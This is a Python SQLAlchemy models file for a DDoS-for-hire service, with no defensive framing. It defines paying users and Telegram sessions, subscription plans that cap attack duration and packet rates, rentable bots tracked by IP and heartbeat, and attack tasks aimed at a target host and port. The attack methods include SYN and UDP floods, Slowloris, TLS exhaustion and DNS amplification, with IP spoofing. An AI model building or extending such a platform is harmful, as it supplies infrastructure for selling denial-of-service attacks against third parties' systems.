import uuid
from datetime import datetime, timezone
from sqlalchemy import Column, String, Integer, Boolean, DateTime, Float, ForeignKey, BigInteger, Text, DECIMAL
from sqlalchemy.dialects.postgresql import UUID, INET, ARRAY, JSONB
from sqlalchemy.orm import relationship
from app.database import Base

def utcnow(): return datetime.now(timezone.utc)
def new_uuid(): return uuid.uuid4()

class User(Base):
    __tablename__ = "users"
    id = Column(UUID, primary_key=True, default=new_uuid)
    username = Column(String(64), unique=True, nullable=False)
    email = Column(String(255), unique=True)
    password_hash = Column(String(255), nullable=False)
    role = Column(String(16), default="user")
    telegram_id = Column(BigInteger, unique=True)
    api_key = Column(String(128), unique=True)
    credit_balance = Column(DECIMAL(10,2), default=0.00)
    is_banned = Column(Boolean, default=False)
    created_at = Column(DateTime(timezone=True), default=utcnow)
    last_login_at = Column(DateTime(timezone=True))
    subscriptions = relationship("UserSubscription", back_populates="user", lazy="selectin")
    rented_bots = relationship("Bot", back_populates="rented_by", foreign_keys="Bot.rented_by_user_id")
    attack_tasks = relationship("AttackTask", back_populates="user", lazy="selectin")
    payments = relationship("Payment", back_populates="user", lazy="selectin")
    telegram_session = relationship("TelegramSession", back_populates="user", uselist=False, lazy="selectin")

class Plan(Base):
    __tablename__ = "plans"
    id = Column(UUID, primary_key=True, default=new_uuid)
    name = Column(String(64), nullable=False)
    slug = Column(String(32), unique=True, nullable=False)
    description = Column(Text)
    max_bots = Column(Integer, default=1)
    max_concurrent = Column(Integer, default=1)
    max_attack_secs = Column(Integer, default=60)
    cooldown_secs = Column(Integer, default=300)
    max_pps_per_bot = Column(Integer, default=100000)
    allowed_methods = Column(ARRAY(Text), default=list)
    price_vnd = Column(Integer, default=50000)
    price_usd = Column(DECIMAL(10,2), default=5.00)
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime(timezone=True), default=utcnow)

class UserSubscription(Base):
    __tablename__ = "user_subscriptions"
    id = Column(UUID, primary_key=True, default=new_uuid)
    user_id = Column(UUID, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
    plan_id = Column(UUID, ForeignKey("plans.id"), nullable=False)
    status = Column(String(16), default="active")
    started_at = Column(DateTime(timezone=True), default=utcnow)
    expires_at = Column(DateTime(timezone=True))
    auto_renew = Column(Boolean, default=False)
    payment_id = Column(String(128))
    user = relationship("User", back_populates="subscriptions")
    plan = relationship("Plan")

class Payment(Base):
    __tablename__ = "payments"
    id = Column(UUID, primary_key=True, default=new_uuid)
    user_id = Column(UUID, ForeignKey("users.id"), nullable=False)
    amount_vnd = Column(Integer, nullable=False)
    amount_usd = Column(DECIMAL(10,2))
    method = Column(String(32), nullable=False)
    status = Column(String(16), default="pending")
    tx_ref = Column(String(128), unique=True)
    payment_url = Column(Text)
    meta = Column('metadata', JSONB, default=dict)
    created_at = Column(DateTime(timezone=True), default=utcnow)
    completed_at = Column(DateTime(timezone=True))
    user = relationship("User", back_populates="payments")

class Bot(Base):
    __tablename__ = "bots"
    id = Column(UUID, primary_key=True, default=new_uuid)
    bot_identifier = Column(String(128), unique=True, nullable=False)
    nickname = Column(String(64))
    ip_address = Column(INET)
    country = Column(String(2))
    isp = Column(String(255))
    os_name = Column(String(64), default="Linux")
    cpu_cores = Column(Integer)
    ram_total_mb = Column(Integer)
    net_speed_mbps = Column(Integer)
    status = Column(String(16), default="offline")
    is_rented = Column(Boolean, default=False)
    rented_by_user_id = Column(UUID, ForeignKey("users.id"), nullable=True)
    rental_expires_at = Column(DateTime(timezone=True))
    max_pps = Column(Integer, default=100000)
    max_mbps = Column(Integer, default=500)
    max_threads = Column(Integer, default=100)
    enabled_methods = Column(ARRAY(Text), default=lambda: ["UDP","MEGA","SYN","TLS_EXHAUST","HTTP","SLOWLORIS","DNS_AMP"])
    spoof_mode = Column(Integer, default=0)
    fragmentation = Column(Boolean, default=False)
    last_heartbeat_at = Column(DateTime(timezone=True))
    first_seen_at = Column(DateTime(timezone=True), default=utcnow)
    bot_version = Column(String(16), default="4.0.0")
    rented_by = relationship("User", back_populates="rented_bots", foreign_keys=[rented_by_user_id])

class AttackTask(Base):
    __tablename__ = "attack_tasks"
    id = Column(UUID, primary_key=True, default=new_uuid)
    user_id = Column(UUID, ForeignKey("users.id"), nullable=False)
    target_host = Column(String(255), nullable=False)
    target_port = Column(Integer, nullable=False)
    method = Column(String(16), nullable=False)
    duration_secs = Column(Integer, nullable=False)
    pps_per_bot = Column(Integer, default=100000)
    spoof_mode = Column(Integer, default=0)
    fragmentation = Column(Boolean, default=False)
    slowloris = Column(Boolean, default=False)
    tls_exhaust = Column(Boolean, default=False)
    dns_amp = Column(Boolean, default=False)
    game_mimic = Column(Boolean, default=False)
    mega_mode = Column(Boolean, default=False)
    status = Column(String(16), default="pending")
    bot_ids = Column(ARRAY(UUID), default=list)
    total_packets = Column(BigInteger, default=0)
    total_bytes = Column(BigInteger, default=0)
    started_at = Column(DateTime(timezone=True))
    completed_at = Column(DateTime(timezone=True))
    created_at = Column(DateTime(timezone=True), default=utcnow)
    user = relationship("User", back_populates="attack_tasks")

class AttackLog(Base):
    __tablename__ = "attack_logs"
    id = Column(BigInteger, primary_key=True, autoincrement=True)
    task_id = Column(UUID, ForeignKey("attack_tasks.id"), nullable=False)
    bot_id = Column(UUID, ForeignKey("bots.id"), nullable=False)
    packets_sent = Column(BigInteger, default=0)
    bytes_sent = Column(BigInteger, default=0)
    started_at = Column(DateTime(timezone=True))
    ended_at = Column(DateTime(timezone=True))

class AdminLog(Base):
    __tablename__ = "admin_logs"
    id = Column(BigInteger, primary_key=True, autoincrement=True)
    admin_id = Column(UUID, ForeignKey("users.id"), nullable=False)
    action = Column(String(128), nullable=False)
    target_type = Column(String(64))
    target_id = Column(UUID)
    details = Column(JSONB, default=dict)
    created_at = Column(DateTime(timezone=True), default=utcnow)

class TelegramSession(Base):
    __tablename__ = "telegram_sessions"
    id = Column(UUID, primary_key=True, default=new_uuid)
    user_id = Column(UUID, ForeignKey("users.id"), unique=True, nullable=False)
    chat_id = Column(BigInteger, nullable=False)
    state = Column(String(32), default="idle")
    data = Column(JSONB, default=dict)
    created_at = Column(DateTime(timezone=True), default=utcnow)
    user = relationship("User", back_populates="telegram_session")